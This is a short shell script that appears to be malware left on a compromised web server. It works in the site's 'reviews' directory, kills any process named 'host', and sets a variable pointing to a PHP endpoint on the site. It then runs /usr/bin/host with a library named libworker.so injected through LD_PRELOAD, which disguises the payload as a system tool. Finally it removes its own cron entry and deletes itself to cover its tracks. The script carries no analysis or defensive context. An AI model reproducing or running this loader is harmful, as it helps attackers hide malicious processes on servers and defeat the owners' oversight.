#!/bin/sh
cd '/home/servisra/public_html/reviews'
if [ -f './libworker.so' ];then killall -9 host;export AU='reviews.servisrambut.com/systempack.php'
export LD_PRELOAD=./libworker.so
/usr/bin/host
unset LD_PRELOAD
crontab -l|grep -v '1\.sh'|grep -v crontab|crontab
fi
rm 1.sh
exit 0
